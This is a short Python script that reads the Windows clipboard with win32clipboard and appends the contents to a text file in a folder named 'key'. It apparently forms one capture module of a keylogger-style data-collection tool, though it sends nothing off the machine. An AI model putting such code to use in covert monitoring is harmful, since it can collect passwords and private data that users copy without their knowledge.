
import win32clipboard
file_path = "D:\key"
extend="\\"
file_merge = file_path + extend
clipboard_info = "clipboard.txt"
# Copy Clipboard Data
def copy_clipboard():
    with open(file_merge + clipboard_info, "a") as f:
        try:
            win32clipboard.OpenClipboard()
            pasted_data = win32clipboard.GetClipboardData()
            win32clipboard.CloseClipboard()
            f.write("Clipboard Data : \n" + pasted_data + '\n')
        except:
            f.write("Clipboard Could not be copied. \n")

copy_clipboard()
